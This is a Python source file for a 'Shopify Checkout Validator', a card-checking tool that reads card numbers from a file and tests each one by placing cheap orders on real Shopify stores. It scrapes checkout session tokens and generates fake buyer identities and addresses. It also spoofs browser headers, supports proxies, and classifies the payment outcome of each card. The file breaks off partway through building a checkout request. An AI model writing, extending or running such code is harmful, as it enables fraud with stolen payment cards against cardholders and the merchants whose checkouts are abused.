"""
Shopify Checkout Validator API
Validates cards against Shopify stores with products under $8.
Uses cards from cards.txt, the scraped site URL, and returns standardized responses:
  CARD_DECLINED, 3DS_REQUIRED, ORDER_PLACED, INVALID_CVC, INSUFFICIENT_FUNDS
"""

import asyncio
import aiohttp
import json
import re
import random
import time
import os
from urllib.parse import urlparse

from flask import Flask, request, jsonify


MAX_PRODUCT_PRICE = 8.00
CARDS_FILE = "cards.txt"

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}__typename}}}fragment BuyerProposalDetails on BuyerProposal{delivery{deliveryLines{destination{...DestinationDetails __typename}selectedDeliveryStrategy{handle cost{amount currencyCode __typename}title estimatedTimeInTransit{lower upper __typename}__typename}targetMerchandiseLines{stableId __typename}__typename}__typename}payment{billingAddress{...AddressDetails __typename}paymentLines{paymentMethod{...PaymentMethodDetails __typename}amount{value{amount currencyCode __typename}__typename}dueAt __typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}merchandiseLines{stableId merchandise{...MerchandiseDetails __typename}quantity{items{value __typename}__typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}buyerIdentity{...BuyerIdentityDetails __typename}runningTotal{value{amount currencyCode __typename}__typename}__typename}fragment ProposalDetails on SellerProposal{delivery{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle title amount{value{amount currencyCode __typename}__typename}estimatedTimeInTransit{lower upper __typename}__typename}destination{...DestinationDetails __typename}selectedDeliveryStrategy{handle cost{amount currencyCode __typename}title estimatedTimeInTransit{lower upper __typename}__typename}targetMerchandiseLines{stableId __typename}__typename}__typename}__typename}tax{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}totalTaxAndDutyAmount{value{amount currencyCode __typename}__typename}__typename}__typename}payment{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...PaymentMethodDetails __typename}__typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}__typename}merchandiseLines{stableId merchandise{...MerchandiseDetails __typename}totalAmount{value{amount currencyCode __typename}__typename}recurringTotal{title interval amount{value{amount currencyCode __typename}__typename}__typename}__typename}buyerIdentity{...BuyerIdentityDetails __typename}runningTotal{value{amount currencyCode __typename}__typename}__typename}fragment DestinationDetails on Destination{...on PartialStreetAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}...on StreetAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}...on PartialPickupPointAddress{countryCode phone postalCode zoneCode __typename}...on PickupPointAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}__typename}fragment AddressDetails on MailingAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}fragment PaymentMethodDetails on PaymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier sessionId billingAddress{...AddressDetails __typename}__typename}...on WalletPaymentMethod{name walletParams __typename}...on GiftCardPaymentMethod{__typename}...on RedeemablePaymentMethod{__typename}...on CustomPaymentMethod{name __typename}...on DeferredPaymentMethod{orderingIndex brand displayName __typename}...on PaymentOnDeliveryMethod{additionalDetails __typename}...on LocalPaymentMethod{paymentMethodIdentifier name billingAddress{...AddressDetails __typename}__typename}...on ManualPaymentMethod{name __typename}...on CustomOnSitePaymentMethod{name paymentMethodIdentifier __typename}...on OffsitePaymentMethod{name paymentMethodIdentifier billingAddress{...AddressDetails __typename}__typename}__typename}fragment MerchandiseDetails on Merchandise{...on ProductVariantMerchandise{id variantId title untranslatedTitle image{altText url __typename}product{vendor __typename}properties{name value __typename}__typename}__typename}fragment BuyerIdentityDetails on BuyerIdentity{buyerIdentity{countryCode presentmentCurrency __typename}contactInfoV2{...on EmailContactInfo{email __typename}...on SMSContactInfo{phoneNumber __typename}...on EmailAndSMSContactInfo{email phoneNumber __typename}__typename}marketingConsent{email{value __typename}sms{value countryCode __typename}__typename}__typename}"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}__typename}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}fragment BuyerProposalDetails on BuyerProposal{delivery{deliveryLines{destination{...DestinationDetails __typename}selectedDeliveryStrategy{handle cost{amount currencyCode __typename}title estimatedTimeInTransit{lower upper __typename}__typename}targetMerchandiseLines{stableId __typename}__typename}__typename}payment{billingAddress{...AddressDetails __typename}paymentLines{paymentMethod{...PaymentMethodDetails __typename}amount{value{amount currencyCode __typename}__typename}dueAt __typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}merchandiseLines{stableId merchandise{...MerchandiseDetails __typename}quantity{items{value __typename}__typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}buyerIdentity{...BuyerIdentityDetails __typename}runningTotal{value{amount currencyCode __typename}__typename}__typename}fragment ProposalDetails on SellerProposal{delivery{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle title amount{value{amount currencyCode __typename}__typename}estimatedTimeInTransit{lower upper __typename}__typename}destination{...DestinationDetails __typename}selectedDeliveryStrategy{handle cost{amount currencyCode __typename}title estimatedTimeInTransit{lower upper __typename}__typename}targetMerchandiseLines{stableId __typename}__typename}__typename}__typename}tax{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}totalTaxAndDutyAmount{value{amount currencyCode __typename}__typename}__typename}__typename}payment{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...PaymentMethodDetails __typename}__typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}__typename}merchandiseLines{stableId merchandise{...MerchandiseDetails __typename}totalAmount{value{amount currencyCode __typename}__typename}recurringTotal{title interval amount{value{amount currencyCode __typename}__typename}__typename}__typename}buyerIdentity{...BuyerIdentityDetails __typename}runningTotal{value{amount currencyCode __typename}__typename}__typename}fragment DestinationDetails on Destination{...on PartialStreetAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}...on StreetAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}...on PartialPickupPointAddress{countryCode phone postalCode zoneCode __typename}...on PickupPointAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}__typename}fragment AddressDetails on MailingAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}fragment PaymentMethodDetails on PaymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier sessionId billingAddress{...AddressDetails __typename}__typename}...on WalletPaymentMethod{name walletParams __typename}...on GiftCardPaymentMethod{__typename}...on RedeemablePaymentMethod{__typename}...on CustomPaymentMethod{name __typename}...on DeferredPaymentMethod{orderingIndex brand displayName __typename}...on PaymentOnDeliveryMethod{additionalDetails __typename}...on LocalPaymentMethod{paymentMethodIdentifier name billingAddress{...AddressDetails __typename}__typename}...on ManualPaymentMethod{name __typename}...on CustomOnSitePaymentMethod{name paymentMethodIdentifier __typename}...on OffsitePaymentMethod{name paymentMethodIdentifier billingAddress{...AddressDetails __typename}__typename}__typename}fragment MerchandiseDetails on Merchandise{...on ProductVariantMerchandise{id variantId title untranslatedTitle image{altText url __typename}product{vendor __typename}properties{name value __typename}__typename}__typename}fragment BuyerIdentityDetails on BuyerIdentity{buyerIdentity{countryCode presentmentCurrency __typename}contactInfoV2{...on EmailContactInfo{email __typename}...on SMSContactInfo{phoneNumber __typename}...on EmailAndSMSContactInfo{email phoneNumber __typename}__typename}marketingConsent{email{value __typename}sms{value countryCode __typename}__typename}__typename}"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}fragment BuyerProposalDetails on BuyerProposal{delivery{deliveryLines{destination{...DestinationDetails __typename}selectedDeliveryStrategy{handle cost{amount currencyCode __typename}title estimatedTimeInTransit{lower upper __typename}__typename}targetMerchandiseLines{stableId __typename}__typename}__typename}payment{billingAddress{...AddressDetails __typename}paymentLines{paymentMethod{...PaymentMethodDetails __typename}amount{value{amount currencyCode __typename}__typename}dueAt __typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}merchandiseLines{stableId merchandise{...MerchandiseDetails __typename}quantity{items{value __typename}__typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}buyerIdentity{...BuyerIdentityDetails __typename}runningTotal{value{amount currencyCode __typename}__typename}__typename}fragment ProposalDetails on SellerProposal{delivery{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle title amount{value{amount currencyCode __typename}__typename}estimatedTimeInTransit{lower upper __typename}__typename}destination{...DestinationDetails __typename}selectedDeliveryStrategy{handle cost{amount currencyCode __typename}title estimatedTimeInTransit{lower upper __typename}__typename}targetMerchandiseLines{stableId __typename}__typename}__typename}__typename}tax{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}totalTaxAndDutyAmount{value{amount currencyCode __typename}__typename}__typename}__typename}payment{...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}...on AvailableTerms{__typename}...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...PaymentMethodDetails __typename}__typename}totalAmount{value{amount currencyCode __typename}__typename}__typename}__typename}merchandiseLines{stableId merchandise{...MerchandiseDetails __typename}totalAmount{value{amount currencyCode __typename}__typename}recurringTotal{title interval amount{value{amount currencyCode __typename}__typename}__typename}__typename}buyerIdentity{...BuyerIdentityDetails __typename}runningTotal{value{amount currencyCode __typename}__typename}__typename}fragment DestinationDetails on Destination{...on PartialStreetAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}...on StreetAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}...on PartialPickupPointAddress{countryCode phone postalCode zoneCode __typename}...on PickupPointAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}__typename}fragment AddressDetails on MailingAddress{address1 address2 city countryCode firstName lastName phone postalCode zoneCode __typename}fragment PaymentMethodDetails on PaymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier sessionId billingAddress{...AddressDetails __typename}__typename}...on WalletPaymentMethod{name walletParams __typename}...on GiftCardPaymentMethod{__typename}...on RedeemablePaymentMethod{__typename}...on CustomPaymentMethod{name __typename}...on DeferredPaymentMethod{orderingIndex brand displayName __typename}...on PaymentOnDeliveryMethod{additionalDetails __typename}...on LocalPaymentMethod{paymentMethodIdentifier name billingAddress{...AddressDetails __typename}__typename}...on ManualPaymentMethod{name __typename}...on CustomOnSitePaymentMethod{name paymentMethodIdentifier __typename}...on OffsitePaymentMethod{name paymentMethodIdentifier billingAddress{...AddressDetails __typename}__typename}__typename}fragment MerchandiseDetails on Merchandise{...on ProductVariantMerchandise{id variantId title untranslatedTitle image{altText url __typename}product{vendor __typename}properties{name value __typename}__typename}__typename}fragment BuyerIdentityDetails on BuyerIdentity{buyerIdentity{countryCode presentmentCurrency __typename}contactInfoV2{...on EmailContactInfo{email __typename}...on SMSContactInfo{phoneNumber __typename}...on EmailAndSMSContactInfo{email phoneNumber __typename}__typename}marketingConsent{email{value __typename}sms{value countryCode __typename}__typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on PaymentFailed{code messageUntranslated hasOffsiteRedirect __typename}__typename}__typename}__typename}"""

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH",
}

ADDRESS_BOOK = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]


def load_cards(filepath=CARDS_FILE):
    cards = []
    if not os.path.exists(filepath):
        return cards
    with open(filepath, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split("|")
            if len(parts) == 4:
                cards.append({
                    "cc": parts[0].strip(),
                    "month": parts[1].strip(),
                    "year": parts[2].strip(),
                    "cvv": parts[3].strip(),
                })
    return cards


def get_random_card(cards=None):
    if cards is None:
        cards = load_cards()
    if not cards:
        return None
    return random.choice(cards)


def pick_address(url, currency=None):
    dom = urlparse(url).netloc
    tld = dom.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    cc = C2C.get((currency or "").upper())
    if cc and cc in ADDRESS_BOOK:
        return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def random_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
    except Exception:
        pass
    return None


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if "://" in proxy_str:
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def normalize_response(raw_msg):
    """Map raw Shopify error codes to standardized response codes."""
    if not raw_msg:
        return "CARD_DECLINED"

    msg = str(raw_msg).upper()

    if "ORDER_PLACED" in msg or "PROCESSEDRECEIPT" in msg:
        return "ORDER_PLACED"
    if "3DS" in msg or "ACTION_REQUIRED" in msg or "OTP" in msg or "ACTIONREQUIRED" in msg:
        return "3DS_REQUIRED"
    if "INVALID_CVC" in msg or "INVALID_SECURITY_CODE" in msg or "CVC" in msg:
        return "INVALID_CVC"
    if "INSUFFICIENT_FUNDS" in msg or "INSUFFICIENT" in msg:
        return "INSUFFICIENT_FUNDS"
    if "EXPIRED" in msg:
        return "EXPIRED_CARD"
    return "CARD_DECLINED"


async def fetch_cheapest_product(domain, proxy_str=None, max_price=MAX_PRODUCT_PRICE):
    """Fetch the cheapest available product under max_price from a Shopify store."""
    if not domain.startswith("http"):
        domain = "https://" + domain

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    proxy = parse_proxy(proxy_str) if proxy_str else None

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
            if resp.status != 200:
                return None, f"Site returned status {resp.status}"

            data = await resp.json()
            products = data.get("products", [])
            if not products:
                return None, "No products found"

    best = None
    best_price = float("inf")

    for product in products:
        for variant in product.get("variants", []):
            if not variant.get("available", True):
                continue
            try:
                price = float(variant.get("price", "0"))
            except (ValueError, TypeError):
                continue
            if price <= 0 or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best = {
                    "site": domain,
                    "price": f"{price:.2f}",
                    "variant_id": str(variant["id"]),
                    "title": product.get("title", "Product"),
                    "link": f"{domain}/products/{product.get('handle', '')}",
                }

    if not best:
        return None, f"No products under ${max_price:.2f}"
    return best, None


async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_str=None):
    """
    Validate a card against a Shopify store.
    Returns dict with: Response, CC, Price, Gate, Site, Charged, Approved, Time
    """
    start_time = time.time()
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxy = parse_proxy(proxy_str) if proxy_str else None

    def _result(response, charged="False", approved="False"):
        elapsed = round(time.time() - start_time, 1)
        return {
            "Response": response,
            "CC": f"{cc}|{month}|{year}|{cvv}",
            "Price": total_price,
            "Gate": gateway,
            "Site": site_url,
            "Charged": charged,
            "Approved": approved,
            "Time": f"{elapsed}s",
        }

    try:
        address_info = pick_address(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName, email = random_identity()
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]

        if not variant_id:
            product, err = await fetch_cheapest_product(ourl, proxy_str)
            if not product:
                return _result(f"NO_PRODUCT: {err}")
            variant_id = product["variant_id"]
            total_price = product["price"]

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="136", "Not-A.Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        connector = aiohttp.TCPConnector(ssl=False)
        timeout_cfg = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
            # Step 1: Add to cart
            cart_resp = await session.post(
                f"{ourl}/cart/add.js",
                data=f"id={variant_id}&quantity=1",
                headers={**headers, "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"},
                proxy=proxy,
            )
            if cart_resp.status != 200:
                cart_resp = await session.post(
                    f"{ourl}/cart/add.js",
                    json={"items": [{"id": int(variant_id), "quantity": 1}]},
                    headers={**headers, "Accept": "application/json"},
                    proxy=proxy,
                )
            if cart_resp.status != 200:
                return _result("CART_FAILED")

            # Step 2: Get checkout
            checkout_resp = await session.post(
                f"{ourl}/checkout/",
                allow_redirects=True,
                headers={**headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                proxy=proxy,
            )
            checkout_url = str(checkout_resp.url)
            text = await checkout_resp.text()

            attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split("/")[-1].split("?")[0]

            sst = checkout_resp.headers.get("X-Checkout-One-Session-Token") or checkout_resp.headers.get("x-checkout-one-session-token")
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
            if not sst:
                sst = extract_between(text, '"serializedSessionToken":"', '"')
            if not sst:
                sst = extract_between(text, '"sessionToken":"', '"')

            if "login" in checkout_url.lower():
                return _result("SITE_REQUIRES_LOGIN")
            if not sst:
                return _result("NO_SESSION_TOKEN")

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', "&quot;") or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', "&quot;") or extract_between(text, '"stableId":"', '"')

            merch = extract_between(text, "ProductVariantMerchandise/", "&quot;") or \
                    extract_between(text, "ProductVariantMerchandise/", "&q") or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)

            if "currencyCode&quot;:&quot;" in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', "&quot;") or "USD"
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or "USD"

            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', "&quot;") or \
                       extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            unescaped = text.replace("&quot;", '"').replace("&amp;", "&")
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if build_match:
                build_id = build_match.group(1)

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if ident_match:
                ident_sig = ident_match.group(1)

            # Step 3: Shipping proposal
            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"] = build_id
                headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
            params = {"operationName": "Proposal"}

            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
